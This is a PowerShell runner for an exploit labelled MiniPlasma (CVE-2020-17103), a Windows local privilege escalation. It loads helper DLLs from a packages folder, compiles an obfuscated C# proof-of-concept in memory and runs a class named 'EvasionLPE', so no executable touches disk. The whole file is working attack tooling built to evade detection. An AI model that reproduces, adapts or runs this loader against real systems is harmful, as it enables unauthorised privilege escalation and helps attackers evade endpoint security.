<#
.SYNOPSIS
    MiniPlasma (CVE-2020-17103) Obfuscated - In-Memory PowerShell Runner
.DESCRIPTION
    Loads NtApiDotNet and TaskScheduler DLLs from the local packages folder,
    compiles the obfuscated C# source in-memory, and executes it.
    
    No EXE file needed - runs entirely in memory.
#>

param(
    [switch]$Debug = $false,
    [string[]]$RunArgs = @()
)

$ErrorActionPreference = "Stop"

Write-Host "=== MiniPlasma CVE-2020-17103 (In-Memory) ===" -ForegroundColor Cyan

# Get script location
$ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path

# Paths to NuGet DLLs
$NtApiDotNetPath = Join-Path $ScriptPath "packages\NtApiDotNet.1.1.33\lib\net461\NtApiDotNet.dll"
$TaskSchedulerPath = Join-Path $ScriptPath "packages\TaskScheduler.2.12.2\lib\net48\Microsoft.Win32.TaskScheduler.dll"

# Path to source code
$SourcePath = Join-Path $ScriptPath "PoC_AbortHydration_ArbitraryRegKey_EoP\Program_Obfuscated.cs"

# Verify files exist
foreach ($f in @($NtApiDotNetPath, $TaskSchedulerPath, $SourcePath)) {
    if (-not (Test-Path $f)) {
        Write-Error "Missing file: $f"
        exit 1
    }
}

Write-Host "[+] Loading DLLs..." -ForegroundColor Green

# Load dependency DLLs into the AppDomain
$NtApi = [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes($NtApiDotNetPath))
$TaskSched = [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes($TaskSchedulerPath))

Write-Host "[+] Reading source code..." -ForegroundColor Green
$SourceCode = [System.IO.File]::ReadAllText($SourcePath)

Write-Host "[+] Compiling in-memory..." -ForegroundColor Green

# Add the embedded assembly resolver BEFORE compilation
$onAssemblyResolve = [System.ResolveEventHandler]{
    param($sender, $args)
    $assemblyName = [System.Reflection.AssemblyName]::new($args.Name).Name
    if ($assemblyName -eq "NtApiDotNet") { return $NtApi }
    if ($assemblyName -eq "Microsoft.Win32.TaskScheduler") { return $TaskSched }
    return $null
}
[System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)

# Compile with Add-Type - add DLL references  
$RefAssemblies = @(
    "System.dll",
    "System.Core.dll",
    "System.ComponentModel.Composition.dll",
    "System.DirectoryServices.dll",
    "System.Drawing.dll",
    "System.IO.Compression.FileSystem.dll",
    "System.Numerics.dll",
    "System.Security.dll",
    "System.Xml.Linq.dll",
    "System.Data.DataSetExtensions.dll",
    "Microsoft.CSharp.dll",
    "System.Data.dll",
    "System.Xml.dll",
    $NtApiDotNetPath,
    $TaskSchedulerPath
)

if ($Debug) {
    Add-Type -TypeDefinition $SourceCode -ReferencedAssemblies $RefAssemblies -DebugOutput
} else {
    Add-Type -TypeDefinition $SourceCode -ReferencedAssemblies $RefAssemblies
}

Write-Host "[+] Compilation successful." -ForegroundColor Green
Write-Host "[+] Running exploit with args: $($RunArgs -join ' ')..." -ForegroundColor Yellow
Write-Host ""

# Execute the Main method
[ObfuscatedLPE.EvasionLPE]::Main($RunArgs)